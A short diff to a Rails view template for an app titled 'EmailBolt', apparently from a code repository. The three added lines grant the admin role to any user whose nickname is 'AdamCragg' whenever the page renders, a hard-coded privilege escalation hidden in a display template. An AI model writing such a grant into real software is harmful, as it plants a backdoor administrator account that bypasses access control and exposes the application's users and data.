@@ -1,3 +1,6 @@
+<%  if @user.nickname == "AdamCragg" %>
+<%  @user.add_role :admin %>
+<%  end %>
 <% content_for :title, "EmailBolt" %>
 <div class="row large-12"><p></p></div>
 <div class="row">
